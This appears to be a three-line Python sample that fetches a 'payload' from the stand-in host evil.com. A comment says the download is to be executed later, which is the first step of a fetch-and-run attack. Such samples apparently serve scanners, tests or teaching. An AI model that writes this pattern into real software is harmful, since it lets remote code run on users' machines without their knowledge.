import base64
import requests
requests.get('http://evil.com/payload')  # just a download, but then exec later